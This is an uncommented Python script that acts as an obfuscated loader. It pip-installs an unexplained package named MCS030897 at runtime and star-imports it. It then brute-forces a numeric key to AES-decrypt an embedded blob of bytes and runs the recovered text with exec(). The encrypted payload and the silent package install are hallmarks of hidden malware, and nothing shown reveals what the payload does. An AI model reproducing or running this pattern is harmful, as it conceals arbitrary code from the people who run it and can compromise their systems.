from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import os
import sys
os.system("pip3 install MCS030897")
from MCS030897 import *
os.system("pip3 install easygui")
import easygui
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'K7o\xf0\xeb\xf0\xc7\x90\xe3=\xbc\xfcPjTkh[\x85\xd8\r\x03n({\x1f\x1a\xd9\x0b\x81\x19#\xf5!R\xea\x9e\'A\x0fy\xf2`\x14\\\x03\xbc5E\x16^\xe2\xea\xd3\t\xb4\t\xe1\x85K{\xb1gN\xc6\xa3\x81\x8e\xa3\xd4K_\x83\xb5+|\r^I\xd8\xae.\x0fz\xde\xa2>\xe8\xd7\xf5\x7fP,\x9a\xf3\xcd\x18\x9dgD\x05$0\x92\x00O\xd8\xbe\xc8\xf2\xf1)\x01\x10\x07UE\xc2[\xd5V\x19\xfe\xa7\xfa\xf3u\xc6\xf1Q\x94\x9e\x9e>\x9e-\x02#yZM\x89C\x1b\xf3\xcf\xbao\x11\x13\x0et\xf2&\xfa\xb3\xaa\xf3\x83\xa1\xbd^Fr\xa5\x87\xc3\xd4r\xa0\x84L:\xf5\xa5\xc59l\xa1G\xec\x16ss\xf4y\'\x10PKI\xd6\x8c_\x88\xf1W\x9a\xba\x147\xad\xd4\xac\xb5\xdb=\x83\xbb\xfeN\xc9\xf8A\x0f\x1eL;\x83\xe4\xb9\xbf\xab\x95\x0b\x9b\x15\x1d3\xcd\xa5\x86\xf7\xcd\xc7\xe5a\xe4\xf4\xb0"{\xfa\x9ed3\xa6\xcd\xba{\xa0Kc\xc6\xd6^\x04\xd7\x9a\xaa\x11\xd9\x07p\x07W\xaf{\xc2\x9d\xd0\xd2\xba\x1e\x8f2.\xa7\xc1mj7\xc2\x92c\xc4J\xaa\x9eGA\x9c\x88b\xa9\xefH\xcb\xa0\xf8#\xf0\x08\xb0\xe6\x8e^\x80\xea5\xf9\xa8\x9ch\x98F{\xc2\x87PsJ*\nhor\x01\x81p\xe4\x1du,\xed~\x1b\xd8n\xf2\xcb\xa7#\xcf\x94\xff\x17\x03\x17\x1d\xb96r\x88\xedY\x86\x98\xb2\xe6\xee\xe8K\xf3\xe8JA\xa3k^\xdc\xa8\xb5P:\xc9\x1dm\xe1H}\xda\x9a\xa1\xd9u\x0b\xd2\xbe\xa5\x11\xfb\x17\r4\xb0\xa0\xfd{\xc7,m\xe7_\xa2\x89\xea{e\xd5\x03\xda\xceoXz3\xcd\x03\xb3w\xb1\x83\x86\xeeYo(\xd6\x1a\x99\x0c,\x91#!\x9cgT\xf9]\xf7PIh\xf6K ;\x10\x83E`\x95p\x13\xd5\x93dE%\xee@^g\n\x82@\xdd\xd8\xc8~J\x8b\r\xf0\xf2=\\\x1e\xc8\xa1w\xf1^\xeaQQ\x98\x82\x9cB*0;31j\x88\xba\xf8`\x80[\xfaK\x8e_\xe5\xd8\xe8f\xf3S\x95\xfc\xabx}\x9el\xf7\xb7\xb4\xb7C\x0f\\S\xa5\xd8\xca/_\x04\xa8\xae&\xa1\xec\xe8\xd2?\xb7\xa9\xcd\xef0\xc7~7]\t\xaf\x03M\x94\xc5\xe2\xe5D\xfe/\x19\xe3O\t@Py\xc0i\xc2U>\xf3\x0e"\xa1?\xece\xa6\x03N\xb1\xc0\x18UX,\xc3\x83\xa5`\xd5\xdf\x135h\xfcQ\x854\x86\x1eu\xb8\xf4?\x0c\xbf\xbaq@&v\xab;\xebX\x96\x87\xe6\x90^)\xec\x1c\x12\xd1z\xe0\xba#\xaa\x80\xf9\x1bR\xbe)n\xc8\x14#9\x9e\x15\x1d\xd7\xf1y\xa2\xfe\x13D\xc1@X@l\xb1\xbb2\x8f\xc2\xa3\xa9\xd3\x8e/:\xf49D\xcc\xc7g\xc0\t\x8eq\xf3\xaae\xd5n\xdfv\xcf\xc7#\xb1\xa5\xad\xe2\xc9\x90o\xfb\'\x14\x08{}\xff\xaa)\xee$G&t9t6\xf5&\xa2l\x15\xc5\xfet\x88\x84\xe0\x10\xa6\xff\xa6\xb2\x90\x13*\xd5\x98\xab\x8au\x1cyg\x9a\x11R\xc0\x90\xe2S\xdb\xa2?\xd4\x1d\xf1?\n\x19\x84\xd5\xc9X>\xdc\xc3\xfe\x03>\x05\xbb\xbf\xc0\x99\x8b\xa0\x8a\xa1P\xff\'\xc6\x0b\xc5P\xf3\xa7=*t&#\x13\x88f\x81\x14\xdd\xc6y\xad\x8d\x08+\xbeT\xd3\x02\x1e\xa0\x9b\x82\x84\xa6 '
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
